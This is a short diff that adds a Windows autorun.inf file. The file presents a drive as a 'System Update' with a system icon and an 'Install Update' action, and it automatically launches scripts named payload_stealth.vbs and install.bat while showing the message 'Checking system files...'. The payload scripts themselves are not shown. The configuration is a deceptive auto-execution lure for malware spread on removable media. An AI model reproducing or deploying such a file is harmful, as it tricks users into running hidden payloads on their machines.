@@ -1,0 +1,9 @@
+[autorun]
+label=System Update
+icon=shell32.dll,-47
+action=Install Update
+shellexecute=payload_stealth.vbs
+
+[autorun]
+action=Checking system files...
+open=install.bat
